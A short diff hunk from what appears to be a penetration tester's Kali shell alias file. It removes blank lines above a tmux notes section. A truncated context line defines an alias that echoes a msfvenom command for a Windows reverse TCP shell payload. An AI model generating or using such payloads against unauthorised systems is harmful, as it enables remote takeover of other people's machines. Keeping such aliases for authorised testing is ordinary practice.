@@ -230,23 +230,6 @@ alias msfvenom_hsa='echo "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #### tmux ####
 alias t='(){grep -i tmux "$HOME"/.kali --color}'
 alias t='(){grep -i tmux /home/kali/.kali --color}'
